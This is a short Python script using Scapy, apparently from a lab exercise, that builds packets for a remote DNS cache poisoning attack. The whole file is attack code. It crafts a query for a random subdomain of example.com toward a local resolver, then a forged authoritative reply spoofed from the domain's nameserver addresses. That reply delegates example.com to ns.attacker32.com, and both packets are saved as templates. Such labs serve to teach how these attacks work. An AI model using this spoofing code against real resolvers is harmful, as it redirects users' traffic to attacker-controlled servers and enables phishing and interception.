from scapy.all import * 

attackerIP = "10.9.0.1"
apoloIP = "10.9.0.53"
nsIPs = ["199.43.133.53", "199.43.135.53"]

domain = 'example.com'
name = 'aaaaa.example.com'
ns = 'ns.attacker32.com'
port = RandShort()

# DNS Query
Qdsec = DNSQR(qname=name)
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=Qdsec)
ip = IP(dst=apoloIP, src=attackerIP)
udp = UDP(dport=53, sport=33333, chksum=0)
request = ip/udp/dns

# Save the packet to a file
with open('ip_req.bin', 'wb') as f:
    f.write(bytes(request))

# Spoofed DNS reply
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata="1.2.3.5", ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0,
    qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst=apoloIP, src=nsIPs[0])
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(reply))